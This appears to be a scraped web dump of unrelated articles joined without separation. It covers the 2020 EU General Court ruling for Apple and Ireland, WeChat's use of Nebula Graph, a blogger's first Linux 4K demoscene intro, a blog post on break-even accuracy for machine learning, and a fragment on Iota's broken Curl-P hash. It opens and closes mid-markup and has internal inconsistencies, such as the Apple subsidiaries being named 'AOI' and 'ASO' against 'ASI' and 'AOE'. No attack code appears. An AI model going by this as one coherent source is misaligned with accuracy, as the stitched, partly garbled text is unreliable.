2.0.<b><u><br></u></b></p><p>Introducing …</p></div></div></div>

                    <p title="Wednesday 15 Jul 2020, 3:25 PM"><span></span>Updated Wed 3:25 PM</p>                <p>A TOP EU court has ruled in favour of Ireland and Apple in their appeal against the European Commission’s finding that the country breached state aid rules in its dealings with the multinational.</p>
<p>The European Commission previously ordered the US company to hand back €13 billion in unpaid tax and over €1 billion in interest payments to the Irish government.</p>
<p>Both Ireland and Apple appealed that ruling and the General Court of the European Union has now found in their favour.</p>
<p>It is widely expected that this ruling will be appealed to the European Court of Justice, with parties having a little over two months to file an appeal.</p>
<p>In its judgement, the General Court of the European Union said:
</p>
<blockquote>
<p>By today’s judgement, the General Court annuls the contested decision because the Commission did not succeed in showing to the requisite legal standard that there was an advantage for the purposes of Article 107(1) TFEU.According to the General Court, the Commission was wrong to declare that Apple Sales International (ASI) and Apple Operations Europe (AOE) had been granted a selective economic advantage and, by extension, State aid.The General Court endorses the Commission’s assessments relating to normal taxation under the Irish tax law applicable in the present instance, in particular having regard to the tools developed within the OECD, such as the arm’s length principle, in order to check whether the level of chargeable profits endorsed by the Irish tax authorities corresponds to that which would have been obtained under market conditions.However, the General Court considers that the Commission incorrectly concluded, in its primary line of reasoning, that the Irish tax authorities had granted ASI and AOE an advantage.
</p>
</blockquote>
<p>Apple Operations International (AOI) and Apple Sales International (ASO) were two Apple subsidiaries that were based in Ireland.&nbsp;</p>
<p>The General Court of Justice went on to say: “The Commission did not prove, in its alternative line of reasoning, that the contested tax rulings were the result of discretion exercised by the Irish tax authorities and that, accordingly, ASI and AOE had been granted a selective advantage.”</p>

<p><strong>Reaction</strong></p>
<p>Both Apple and the Irish government have welcomed the judgement.</p>
<p>“This case was not about how much tax we pay, but where we are required to pay it,” an Apple spokesman said in a statement.</p>
<p>“We’re proud to be the largest taxpayer in the world as we know the important role tax payments play in society,” Apple added.</p>
<p>The government has welcomed the judgement, stating in a statement that Ireland has “always been clear that, based on Irish law, the correct amount of Irish tax was charged and that Ireland provided no State aid to Apple”.&nbsp;</p>
<p>“Ireland appealed to the Commission decision on that basis and the judgement today from teh court vindicates this stance.”</p>
<p>The Department of Finance said the decision showed there had been “no special treatment” for the tech giant.</p>
<p>“We welcome the judgment by the General Court of the European Union annulling the Decision of the European Commission of August 2016, which alleged Ireland provided State aid to Apple,” the department said in a statement.</p>
<blockquote>
<p>Ireland has always been clear that there was no special treatment provided to the two Apple companies – ASI and AOE. The correct amount of Irish tax was charged taxation in line with normal Irish taxation rules. Ireland appealed the Commission decision on the basis that Ireland granted no state aid and the decision today from the Court supports that view.</p>
</blockquote>
<p>Finance Minister Paschal Donohoe said the judgement “proves Ireland was correct to pursue this case in the European courts”.&nbsp;</p>


<p>The court was asked to determine whether two tax rulings delivered by Revenue in 1991 and 2007 allowed Apple to funnel profits through Irish-anchored structures without paying tax in any jurisdiction.</p>
<p>It is the first legal ruling in a case that formally kicked off in 2014 when the Commission opened an investigation into the matter, which concluded in 2016. The decision could have major implications for the European Commission’s plans to harmonise tax regimes across member states.&nbsp;</p>
<p>The Commission had found that the two rulings had breached EU state aid rules designed to prevent individual companies from receiving favourable treatment from member state governments. As then-commissioner for competition Margrethe Vestager put it at the time, “Ireland had granted illegal tax benefits to Apple”.</p>
<p>After concluding that Apple had been paying corporation tax at an effective rate of just 0.005%, the Commission ordered the US company to hand back €13 billion in unpaid tax and over €1 billion in interest payments to the Irish government.&nbsp;</p>
<p>Apple denied that it had ever sought special deals with any government and accused the Commission of selectively quoting “tiny figures”.&nbsp;</p>
<p><a href="https://ec.europa.eu/commission/presscorner/detail/en/statement_20_1356">In a statement this morning</a> Vestager, who is now Executive Vice-President of the Commision, said that the body will “carefully study the judgment and reflect on possible next steps”.</p>
<p>“The Commission stands fully behind the objective that all companies should pay their fair share of tax,” she said.&nbsp;</p>
<blockquote>
<p>If member states give certain multinational companies tax advantages not available to their rivals, this harms fair competition in the EU. It also deprives the public purse and citizens of funds for much needed investments the need for which is even more acute during times of crisis.</p>
</blockquote>
<p><strong>Political reaction</strong></p>
<p>Following Apple’s appeal of the 2016 Commission finding, the Fine Gael minority government at the time, supported by Fianna Fáil, decided to join the appeal – prompting significant political and public opposition.</p>

<p>Responding to the ruling this morning, former minister Charlie Flanagan said: “Important EU court ruling vindicates actions of Enda Kenny, Michael Noonan and government despite incessant hostility at home and abroad.”</p>
<p>Sinn Féin’s finance spokesperson Pearse Doherty TD said that “morally this is a terrible day” because Apple was allowed to avoid paying a “fair amount of tax”</p>
<p>“Apple had three stateless companies here, ‘we shouldn’t pay tax here, or anywhere in the world’. So, while the Department of Finance may be thinking that this is a good day for themselves, morally this is a terrible day,” Doherty told RTÉ’s Today with Sarah McInerney.</p>
<p>“The richest company in the world was able to generate over €100 billion of profits and not pay tax anywhere in the world on those profits despite the fact that the companies are incorporated here in Ireland. “&nbsp;</p>

<span>2020-07-02</span></p></div><p><img src="https://user-images.githubusercontent.com/57335825/87518187-cdb4d200-c634-11ea-9dc4-264001420b55.png" alt="Nebula Graph for Large Social Network: Practices at WeChat"></p><p>WeChat is one of the social network apps in the world that deals with large scale heterogeneous graphs. The dataset to be processed has:</p><ul><li>One trillion edges/connections</li><li>A total dataset of 150TB</li><li>An hourly update of 100 billion connections,</li></ul><p>And it is a huge challenge. The team at WeChat encountered problems when using <a href="https://github.com/vesoft-inc/nebula">Nebula Graph</a>, an open source distributed graph database.</p><p>However, through deep customization capabilities in the database, the team has realized some useful on-demand features. They include big data storage, data import for large data sets with a fast performance, version control, rollback at the second level, and access to the database at millisecond level.</p><h2 id="the-challenges-facing-large-internet-companies">The Challenges Facing Large Internet Companies</h2><p>Most well-known graph databases are not capable of dealing with truly big data. For example, the community version of <a href="https://neo4j.com/">Neo4j</a> provides single-host service and is widely adopted in the knowledge graph area. However, when it comes to a very large data set this solution misses the mark. And large data sets are increasingly common in today’s business world.</p><p>Plus, there are issues like data consistency and disaster recovery to consider if you choose a multi-copy implementation. <a href="https://janusgraph.org/">Janus Graph</a> has solved the big data storage problem by using external metadata management, kv storage and indexes. Yet the performance has been widely criticized. As a result, most graph database solutions that the WeChat team evaluated are many times better than Janus Graph in terms of performance.</p><p>Some Internet companies build their own databases. These self-developed solutions are catering to their own business requirements, rather than for general graph scenarios. So, they support only a limited proportion of query syntaxes.</p><h3 id="geabase-from-ant-financial">GeaBase from Ant Financial</h3><p><a href="https://tech.antfin.com/products/GEABASE">GeaBase</a> is another option, mainly used in the finance industry. It features a self-developed query language, pushdown computation and millisecond latency. The main scenarios for its usage include risk management in financial organizations. To this end, it supports a transaction network with trillions of edges/relationships, storing real-time transaction data, real-time fraud detection.</p><p>It is also useful for recommendation engines. This includes applications like stocks and securities recommendations. Its Ant Forest features the capability to store trillions of nodes, strong data consistency, and low latency querying. It also has a GNN feature for Dynamic Graph CNN, for online inference based on dynamic graphs.</p><h3 id="igraph-from-alibaba">iGraph from Alibaba</h3><p>There is also iGraph, a graph indexing and query system. It stores user behavior information and serves as one of the four backbone middle platforms in Alibaba. iGraph has adopted Gremlin as its graph query language for real-time queries of e-commerce relationships.</p><h3 id="bytegraph-from-bytedance-aka-tiktok">ByteGraph from ByteDance (a.k.a TikTok)</h3><p>By adding a cache layer to the kv layer, ByteGraph splits the relationships into B+ trees for efficient access to edges and data sampling. The structure is like the TAO of Facebook.</p><h2 id="architecture-of-the-wechat-big-data-solution">Architecture of the WeChat Big Data Solution</h2><p>The WeChat team has come up with the following architecture to solve the big data storage and processing problem.</p><p><img src="https://user-images.githubusercontent.com/57335825/86352447-a87a9980-bc1a-11ea-83c6-47a481675e9e.png" alt="Architecture of the WeChat Big Data Solution"></p><h2 id="why-nebula-graph">Why Nebula Graph?</h2><p>As seen in the architecture above, a graph database is the main component of the solution. WeChat ended up selecting Nebula Graph as the starting point of its journey in exploring graph databases.</p><p>WeChat found Nebula Graph had the most potential for handling huge dataset storage needs based on the capability of dataset partitioning and an independent relationship storage. It also had pushdown computation and MPP optimization based on the strong consistency storage engine. Finally, the team had extensive experience in the graph database field and a proven model for abstraction for big data.</p><h2 id="problems-in-practice-nebula-graph">Problems in Practice Nebula Graph</h2><h3 id="insufficient-memory">Insufficient Memory</h3><p>The WeChat team encountered memory issues. At its essence, it was a problem of performance versus resources. Memory occupation is an un-neglectable issue in an application dealing with large scale datasets.
There are a couple of components in RocksDB that contribute to memory usage. There are Block cache, Indexes and bloom filters. There are also Memtables and Blocks pinned by iterators.
So, the WeChat team moved to optimize memory utilization. It began with block cache optimization. To do this, it adopted a global LRU cache to control the cache occupation of all RocksDB instances in a machine.</p><p>Then the team did a bloom filter optimization. An edge is designed as a key-value pair and stored in RocksDB. If all keys are stored in a bloom filter and each key occupies 10bit, then the memory required by the entire filter will exceed the machine memory by a large margin.</p><p>The team observed that most of the time the requests are to acquire a list of edges for a specific node. Therefore, the team adopted a prefix bloom filter. Another optimization was made to create indexes for properties on vertices, which enables acceleration for most requests. Finally, the memory occupation of a single-host filter is at the gigabyte level without sacrificing the speed of most requests.</p><h3 id="version-control">Version Control</h3><p>There are several business requirements in practice for version control. It offers graph data fast rollback, periodic full data import, and automatic access to the latest versioning data. The team has classified data sources into two categories.</p><p>Recurring data, for example, generates a list of similar users by day and the data takes effect after being successfully imported. Then there is History data and real-time data. For example, there is refresh history data by day and the team combines the history data with real-time data as full data to be imported.</p><p>Following is the data storage model in RockDB.</p><p>Vertex Storage Model:</p><p><img src="https://user-images.githubusercontent.com/57335825/86352518-c516d180-bc1a-11ea-9ea3-25a774e6478c.png" alt="Vertex Storage Model in RocksDB"></p><p>Edge Storage Model:</p><p><img src="https://user-images.githubusercontent.com/57335825/86352600-e2e43680-bc1a-11ea-819c-6161cdf719b3.png" alt="Edge Storage Model in RocksDB"></p><p>Timestamp is used as the versioning method for real-time data. The version of imported data is specified manually. In practice, the team has three options for version control. First, reverse_versions, where the list of versions is to be kept for rollback. Second is active_version, where the version is accessed by users’ requests. And finally, max_version, where data is reversed after a certain version. The reversed data is the combination of the history data and the real-time data.</p><p>Using the three options, the team can manage offline data and online data efficiently. The data that is no longer used is cleared from the disk during the next compaction.
In this way, the application can update the data version without in the background. And the data rollback can be completed within seconds.</p><p>Below are some examples:</p><ul><li>Keep three versions of data and activate one of them</li></ul><p><code>alter edge friend reserve_versions = 1 2 3 active_version = 1</code></p><ul><li>Data sources are history data and real-time write data</li></ul><p><code>alter edge friend max_version = 1592147484</code></p><h2 id="fast-full-data-import">Fast Full Data Import</h2><p>Conducting data imports at a large scale is a common practice. The import requests, without any optimization, would not only affect requests in production, but take longer than a day to complete. So, it became an urgent requirement to improve import speed. SST Ingest is a commonly adopted method to achieve fast import. The WeChat team adopted something similar.</p><p>The team generated SST files offline via scheduling Spark tasks. Storage nodes pull the data required and ingest the data to the graph database. And, then there is access to the latest versioning data via the version control request. The import process takes several hours to complete, which is fast. And it does not affect requests to the graph database because the computation is mainly offline.</p><p>The shared-nothing architecture is a widely discussed method for ensuring horizontal scalability. It requires programming skills to implement the architecture in practice. The meta cache is encapsulated with <code>shared_ptr</code> and is frequently accessed, making it a warm bed for atomic operation clashing. To realize shared-nothing, the WeChat team copied each meta cache as a local thread. This <a href="https://github.com/vesoft-inc/nebula/pull/2165">pull request</a> provides details.</p><p>It has been a long journey to achieve graph database utilization. And it is one that continues with success in large part by overcoming obstacles.</p><h2 id="you-might-also-like">You Might Also Like</h2><ul><li><a href="https://nebula-graph.io/posts/detect-corona-virus-spreading-with-graph-database/">Detect Corona Virus Spreading With Graph Database Based on a Real Case</a></li><li><a href="https://nebula-graph.io/posts/review-on-graph-databases/">A Review of Graph Databases</a></li></ul><blockquote><span>Like what we do ?

<p><h2>My First Demoscene production</h2></p> 
<em>15-07-2020</em> 
<p>This year, I made my first ever demo! I've been threatening to do so for ages now, but since the lockdown hit, I've really had no excuse not to. For these of you unfamiliar with the demoscene, it's a small, yet internationally recognised[^0] subculture revolving around computer art. Some of the best programmers and artists produce works for all sorts of computers and electronic equipment, pushing the machines and themselves to the very limit! There are demoscene parties taking place all over Europe (and some further afield). I entered <a href="http://novaparty.org/">NOVA</a> this year - the UK's main demoscene party, and had great fun doing so.</p>
<h3>Demos and the Demoscene</h3>
<p>The demoscene has been around for a while now. It started out when crackers learned to break the copy protection on games. To show off their prowess, these expert programmer-pirates would leave messages at the beginning of the game. These messages often had music, scrollers, custom art. You can draw quite a few parallels to graffiti work, and I mean <em>really good</em> graffitti work! Some of these <em>'cracktros'</em> are incredible! The crackros became the main event, and the demoscene was born.</p>
<p>Back in these days, before the internet, demos were distributed via disk or bulletin boards. You could swap disks with folks you knew, dial into a modem and download, get disks in the mail, or go to a demoparty. Demo parties are still going today, stronger than ever one could argue. The largest Demoscene party is <a href="https://2019.revision-party.net/">Revision</a>, held in Saarbrucken, Germany. I've been a couple of times - you'll see some of the finest computer art in the world at this event! </p>
<p>Parties tend to be built around competitions. There are several categories and you can enter as many as you like. The competitions range from oldschool demos, such as these written for the <a href="https://en.wikipedia.org/wiki/Amiga">Amiga</a> or the <a href="https://en.wikipedia.org/wiki/ZX_Spectrum">ZX Spectrum</a>, to 64K PC Demos - where the size limit is 64K. There are competitions for music, ranging from new school to tracked, and also competitions for Pixel Art and digital photography. Something for everyone.</p>
<p>Quite often, folks will get together to form a demoscene group. Musicians, teaming up with programmers and illustrators to create entries none of them could do on their own. Some of these groups have been going for decades, albeit with different members.</p>
<p>In the past, computers were a bit more restrictive than they are now. 3D rendering on the Amiga is quite the task whereas it's quite trivial on a modern PC. To keep up the challenge, a set of size-coding competitions were devised. The idea is fairly simple - see how much you can do with 64K, 8K or 4K. Some competitions even go as far down as 256 Bytes[^3]! For reference, an average email is around 400 Kilobytes.</p>
<iframe width="881" height="496" src="https://www.youtube.com/embed/JZ6ZzJeWgpY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>Some of these competition entries are absolutely fabulous. One of my favourites is <a href="http://www.pouet.net/prod.php?which=67113">Fermi Paradox</a>; a 64k entry by the demogroup <a href="https://mercury.sexy/">Mercury</a>. I'm still amazed that not only can so much be packed into such a small space, but that so much can be <em>said</em> in a short space of time. The programming skill is only matched by the art.</p>
<h3>Linux 4K</h3>
<p>One of the things I've noticed is there are very few Linux demos. This sounds odd to me as Linux is quite the open platform, at least compared to Windows. However, Windows has been the mainstay of the PC demoscene for much of the scene's history. I think this is because the graphics drivers tend to be better, Windows setups are much more homogeneous (you can generally rely on certain libraries being around), and more of a history of the kinds of hacking techniques often used in demo production. As more demos were released for Windows, more demotools became available. Tools such as <a href="http://crinkler.net/">crinkler</a>, which compresses your demos down to a tiny size, to the <a href="https://github.com/laurentlb/Shader_Minifier">shader minifier</a>. Linux hasn't got there yet with it's tooling, until recently.</p>
<p>Thanks to the efforts of <a href="https://bitbucket.org/blackle_mori/scalemark/src/master/">Blackle</a> and <a href="https://gitlab.com/PoroCYon/linux-4k-intro-template">poroCyon</a>, we now have a starting template for Linux 4K entries. I took a look at how the template was built up. There seems to be the following processes:</p>
<ul>
<li>Compress the shaders into a header file with shader minifier</li>
<li>Build the object files with some embedded assembly (which I don't understand!)</li>
<li>Strip out any of the bits of the ELF Header we don't need. </li>
<li>Link everything together with the <a href="https://github.com/Shizmob/smol">Shoddy minsize-oriented linker (SMOL)</a></li>
<li>Compress everything with the <a href="https://in4k.github.io/wiki/lsc-wiki-vondehi.html">vondehi</a> program.</li>
</ul>
<p>Vondhehi is quite funky! The decompressor itself is loaded into your program and decompresses the rest of the program once the program is run. </p>
<p>There are no doubt other subtle things going on. If you want to know more, <a href="https://www.youtube.com/watch?v=a03HXo8a_Io">there is a talk from Revision you can watch</a> that explains the process in more detail. The code-base itself seems a little complicated but some of that is down to the tools being made for windows; there is a dependency on <a href="https://www.mono-project.com/">Mono</a> (among other things) for example. Nevertheless, it's quite possible to get down to an executable of 4K or smaller.</p>
<figure><img src="https://shutr.benjamin.computer/inpost/numenera1.jpg" alt="Generating protein images."><figcaption>Screenshot from within the mysterious Menger Sponge!</figcaption></figure>

<p>This demo runs on every Linux setup I've tested it on. The de-facto standard for demoparties seems to be Ubuntu (at the time of writing, Ubuntu 18 for Revision). All size coding demos rely on some libraries being pre-installed. Unlike Windows, there is no guarantee you'll have the library you want installed under Linux, so this template comes with three options for the OpenGL context: SDL2 and GTK3. I went with SDL2 in the end, as it resulted in a slightly smaller filesize.</p>
<h3>Music</h3>
<p>Definitely my weakest area this one. I had no idea where to begin. Thankfully the template is setup to use a tracker or synthesizer. I honestly don't know how this bit works but after looking around briefly, I found a program called <a href="https://www.renoise.com/">Renoise</a>. Apparently, there are set of instruments made by demosceners that can be loaded into renoise, whereupon you can make your soundtrack. These instruments tend to compress rather well it is claimed. <a href="https://github.com/askeksa/Oidos">Oidos</a>, <a href="http://4klang.untergrund.net/">4KLang</a> and <a href="http://www.pouet.net/prod.php?which=61592">Clinkster</a> are recommended in the template. I decided to go with Clinkster for no real reason at all. </p>
<p>Renoise is a Windows program unfortunately, but it seems to run well enough under <a href="https://www.winehq.org/">Wine</a>. I could create a tracked piece of music fairly quickly (I use music in the loosest possible sense of the word!). With the file placed in the right directory, the template makefile rolls it in quite easily.</p>
<p>If you want to know more about demoscene music and listen to the work of someone who really knows what they are doing, check out <a href="https://soundcloud.com/h0ffman">h0ffman</a>. He has <a href="https://hoffman.home.blog/2019/04/27/eon/">a good write-up on his site</a> about the kinds of hoops a demoscener composer needs to jump through.</p>
<h3>Raymarching Menger Sponges</h3>
<p>With everything in place, I set to. I'd wanted to learn a bit more about fractals and how they are rendered. I started with the <a href="https://en.wikipedia.org/wiki/Menger_sponge">Menger sponge</a> -  a classic fractal. I like the look of it! Something weirdly alien yet constructed. I thought I'd use this as the main feature around which this intro would be based.</p>
<p>Normally, fractals are described using <a href="https://en.wikipedia.org/wiki/Recursion">recursion</a>. It's an elegant way of of generating an image as fractals are self similar. However, in a fragment shader, this isn't possible.</p>
<p>It's worth mentioning what a <a href="https://www.khronos.org/opengl/wiki/Fragment_Shader">fragment shader</a> is. In early 3D graphics, the pipeline that took your triangles and spat out pixels on your screen was fixed; you couldn't really tweak it. Nowadays, you can alter the functionality of many different sections of the pipeline using small programs called <em>shaders</em>. The fragment shader is the last shader in the line before the pixels appear. It's sometimes called a pixel shader too, though you aren't manipulating pixels at this point (well, you are close enough I guess). </p>
<p>The fragment shader is where all the graphics magic happens. You are given a fragment and you output a colour for that fragment. The in-between step is where the fun is. We can use a technique known as raymarching. </p>
<p>Raymarching (or Volume Ray Casting) is used all over the place in a lot of demos; it's a powerful technique. Similar to raytracing, you shoot a ray from your camera through the screen at the fragment position. You then need to find out what this ray hits. To do that, you use a <a href="https://prideout.net/blog/distance_fields/">distance field</a>.</p>
<p>Distance fields are a parametric way of defining a scene. The simplest example is a sphere. A sphere can be defined as a 3D point and a radius - 4 numbers. From these four numbers you can figure out the distance from where your ray is, to the sphere, even figuring out where on the sphere your ray will intersect. The next step is to <em>march the ray</em> that distance and then check again how far away you are. </p>
<p>You can build up an entire scene this way, with multiple objects, creating realistic lighting, special effects and more! It's a really powerful technique made famous by the website <a href="https://www.shadertoy.com/">Shadertoy</a> and it's creator, <a href="https://iquilezles.org/">Iniqgo Quilez</a>. His site details a number of <a href="https://iquilezles.org/www/articles/distfunctions/distfunctions.htm">mathematical formulas for distance fields</a> though I can't claim to understand most of them. However, we can do all this in a single pixel shader.</p>
<p>Back to our Menger sponge then. If we can do it recursively, we'll have to go iteratively. One way we can create the sponge is to start with a field for a large cube and effectively carve out the holes using smaller cuboids and a subtraction function. Turns out all of these are easy to do in a fragment shader if you have the right functions. An excellent set of such functions can be found on <a href="https://mercury.sexy/">Mercury's homepage</a>.</p>
<h3>Numenera</h3>
<p>Back to our demo. I had the idea of using a Menger Sponge but no idea on the actual <em>art</em>. Where to begin? What was a trying to say? I must admit, this bit really took me by surprise how hard it was! I suppose that's a bit of a cliche right - the engineer trying to do an art? Still, undeterred, I'd been reading a little about the roleplay game <a href="https://en.wikipedia.org/wiki/Numenera">Numenera</a>. I liked the idea of long lost advanced technology. I pictured a desert, with an ancient and worn down artefact, suddenly coming alive as we observe it. I had an idea, so off I went!</p>
<p>The desert part is quite easy - it's just a plane with a noise offset on the distance field. I used Iq's lighting model for the shadows and the ambient occlusion. With …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This post appeared first on <a href="https://towardsdatascience.com/return-on-investment-for-machine-learning-1a0c431509e">Towards Data Science</a> on July 8th, 2020.</p></blockquote><p>Machine learning deals with probabilities, which means there’s always a chance for mistakes. This inherent uncertainty causes many decision makers feel uncomfortable with implementing machine learning and traps them in an endless chase for the magical 100% accuracy. The fear of mistakes nearly always pops up when I’m working with companies taking their first steps towards intelligent automation, and I get asked “What if the algorithm makes a wrong prediction?”</p><p>If this issue is not addressed, the company will very likely spend a hefty amount of resources and years of development time on machine learning without ever getting returns for their investment. In this article, I’ll show you the simple equation I use to relieve these concerns and get decision makers more comfortable with the uncertainty.</p><h3>When is machine learning worth it</h3><p>Just like with any investment, the feasibility of machine learning comes down to whether it generates more value than it costs. It’s a normal Return on Investment (ROI) calculation which, in the context of machine learning, weighs the generated value against the cost of mistakes and accuracy. So instead of asking “How do we get 100% accuracy?”, the right question is “How do we maximize ROI?”</p><p>Determining the expected returns is quite straightforward. I usually begin opening up the business case for machine learning implementation by comparing its benefits against the potential costs in mathematical terms. This can be formalized in an equation which basically says “What’s left of the generated value after the cost of mistakes is accounted for?” Solving this simple equation allows us to estimate the profits for different scenarios.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_simple.png" alt="returns = value - (1 - accuracy) * cost of a mistake"></p></div></div><p>Let’s look at the variables:</p><ul><li><strong>returns</strong>: Generated net value or profit per prediction  </li><li><strong>value</strong>: The new value generated by every prediction (e.g. assigning a document to the right category now takes 0.01 seconds instead of 5 minutes, so the value is 5 minutes saved)  </li><li><strong>accuracy</strong>: The accuracy of predictions made by the algorithm  </li><li><strong>cost of a mistake</strong>: The additional costs incurred by a wrong prediction (e.g. it takes 20 minutes for someone to correct the mistake in the system)  </li></ul><p>By flipping the equation around and setting returns to zero, we get the minimum accuracy required to generate net value. This is called <strong>break-even accuracy</strong>:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_simple_flip.png" alt="accuracy = 1 - (value / cost of a mistake)"></p></div></div><p>The equation gets more intuitive when plotted in a graph:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_simple_graph.png" alt="Break-even point visualized"></p></div></div><p>So let’s say each prediction saves you 5 minutes of work but it takes 20 minutes of extra work to fix a wrong prediction. We can now calculate the break-even accuracy to be 1–5/20 = <strong>75%</strong>. Any improvement after this point brings concrete profits.</p><p>The above equation assumes us to blindly accept any prediction the algorithm makes and fix the errors afterwards. Sounds risky? We can do much better by extending the equation with confidence scores to lower the risks.</p><h3>Optimizing ROI</h3><p>A machine learning algorithm (done right) does not only spew out predictions, it also tells us how confident it is in every prediction. The majority of mistakes happen when the algorithm is unsure of its answer, allowing us to focus automation on the highest certainty predictions while manually reviewing the lowest few. Even though manual review does cost a bit of labor, it’s normally much cheaper than fixing a mistake later on.</p><p>Let’s choose a threshold which picks out 10% of the least confident predictions for manual review. The rest 90% will be handled automatically. This ratio is called confidence split. The accuracy in the high confidence bracket will now be considerably better since many of the mistakes are caught in the small unconfident bracket. This leads us to the extended equation. It says “What’s left of the generated value after the costs of mistakes and manual review are accounted for?”</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_extended.png" alt="returns = (value - (1 - confident accuracy) * cost of a mistake) * confidence split - (1 - confidence split) * cost of manual review"></p></div></div><p>Let’s look at the variables:</p><ul><li><strong>returns</strong>: Generated net value or profit per prediction  </li><li><strong>value</strong>: The new value generated by every prediction  </li><li><strong>confident accuracy</strong>: The accuracy of predictions in the high confidence bracket  </li><li><strong>cost of a mistake</strong>: The additional costs incurred by a wrong prediction  </li><li><strong>confidence split</strong>: The ratio of high confidence predictions (90% in our case)  </li><li><strong>cost of manual review</strong>: The costs of manually reviewing the prediction  </li></ul><p>We can again flip the equation to calculate the break-even accuracy by setting returns to zero, like so:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_extended_flip.png" alt="confident accuracy = ((1 - confidence split) * cost of manual review) / (confidence split * cost of a mistake) - value / cost of a mistake + 1"></p></div></div><p>We’ll solve it using the following variables:</p><ul><li>value = 5 minutes saved  </li><li>cost of a mistake = 20 minutes  </li><li>cost of manual review = 5 minutes  </li><li>confidence split = 0.9  </li></ul><p>Now the new break-even accuracy is 78%. Wait a minute, that’s higher than with the simpler equation, did it just get worse? Not quite! Remember that many of the mistakes are caught in the low confidence bracket, which significantly boosts the accuracy in the high confidence bracket. Even though the minimum accuracy requirement for break-even got higher, it is now much easier to achieve.</p><p>The ability to calculate the profitability of a machine learning algorithm in operation allows you to find the optimal accuracy. And no, it’s not 100%. As I discussed in my previous article, the development cost of any system increases exponentially while providing diminishing returns. With the above equations, you can estimate a realistic ROI and calculate the point where accuracy improvements incur more development costs than increase in returns in a time-frame of your choice. That’s the ROI-optimized accuracy.</p><h3>Practical example</h3><p>Let’s take a real world scenario and run through the whole thing. Imagine your Accounts Payable team handles 5000 invoices every month, and you’ve been presented the idea of automating a part of the process. More specifically, the proposed automation would categorize incoming invoices to match complex internal vendor codes, which is currently done manually. You need to figure out whether a machine learning approach is worth the effort to solve this task.</p><p>In terms of data, below is what you’ll be working with. You have a history of previously processed invoices and the correct “Vendor_Code” value for each. The task is to predict the right “Vendor_Code” for any new invoice. You can find the original dataset <a href="https://www.kaggle.com/nikhil1011/predict-product-category-from-given-invoice/data#Train.csv">here</a>.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_data.png" alt="Sneak peet at the data"></p></div><p><span>Sneak peet at the data</span></p></div><p>To start off, use any machine learning library or tool you prefer and run a basic accuracy test for the data. I’m using aito.ai which gives me an accuracy of 78% after training with 4000 rows and testing with 1500 rows. If we use the same values and costs as before, we can calculate the monthly returns with the first equation:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_calc_simple.png" alt="returns = 5 minutes - (1 - 0.78) * 20 minutes = 0.59 minutes"></p></div></div><p>Using the simple approach which ignores the confidence scores, every prediction made by the algorithm with 78% accuracy saves you on average 0.59 minutes of work, or 35 seconds. That means almost <strong>50 hours of work saved every month</strong> from processing 5000 invoices. Not bad.</p><p>Now let’s look at the equation which considers confidence scores. I compiled the results and confidence scores for each prediction into a neat table like below which allows us to divide them into high and low confidence brackets. In this case, any prediction with confidence lower than 0.21 will be reviewed manually. This threshold gives us the 90/10 confidence split.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_conf_table.png" alt="Prediction results, including confidence scores"></p></div><p><span>Prediction results</span></p></div><p>The accuracy in our high confidence bracket is an impressive 84%, and a measly 22% in the low confidence bracket. This makes the impact of utilizing confidence scores crystal clear. Now we can calculate the new returns when confidence and manual review costs are a part of the equation:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_calc_extended.png" alt="returns = (5 minutes - (1 - 0.84) * 20 minutes) * 0.9 - (1- 0.9) * 5 minutes = 1.15 minutes"></p></div></div><p>The extended approach nearly doubles the returns! Every prediction saves, on average, 1.15 minutes. Processing your 5000 monthly invoices now involves <strong>95 hours less work</strong> even when the cost of mistakes and manually reviewing 10% of the predictions are accounted for. That’s pretty great!</p><p>Now you know the level of profitability you can currently achieve. And even better, you now have a tool to determine the feasibility of further machine learning development. For example, with the equation, you may calculate the returns for a hypothetical 90% accuracy and find the returns to be <strong>183 hours saved monthly</strong>. Compare it to the estimated development costs of reaching the 90% accuracy and you’ll have factual data for deciding if further development is worth the investment.</p><h3>Summing it up</h3><p>As you’ve seen, machine learning should be approached just like any other investment. The inevitable mistakes are just a cost of doing business and they’re normal variables in our calculations. Armed with these equations, you know exactly when to start reaping the benefits of machine learning without playing a guessing game, and you can put the algorithms into production way earlier. Be freed from the endless grind towards 100% accuracy and start generating value already.</p><p><strong>Done is better than perfect.</strong></p><a href="https://aito.ai/blog">Back to blog list</a></div></div>]]>

<h2>Historical Context of Iota’s Hash Functions</h2>



<p>Once upon a time, researchers discovered that the hash function used within the Iota cryptocurrency (Curl-P), was <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Narula-Heilman-Cryptanalysis-of-Curl-P-wp.pdf">vulnerable to practical collisions</a>. When pressed about this, the Iota Foundation said the following:</p>



<figure><div>

</div><figcaption>You can read this statement from the source <a href="https://blog.iota.org/official-iota-foundation-response-to-the-digital-currency-initiative-at-the-mit-media-lab-part-4-11fdccc9eb6d">here</a>. Archived <a href="https://archive.md/fZ1Dm">here</a>.</figcaption></figure>



<p>In response to this research, the Iota developers threatened to sue the researchers.</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Oh good. Here’s an IOTA founder darkly threatening to sue a researcher who found out that the IOTA hash function was broken (something he later claimed was done on purpose.) <a href="https://t.co/myRCv098uf">pic.twitter.com/myRCv098uf</a></p>— Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/status/965731647579664385?ref_src=twsrc%5Etfw">February 19, 2018</a></blockquote></div>
</div><figcaption>Threatening security researchers is toxic and shady as fuck.</figcaption></figure>



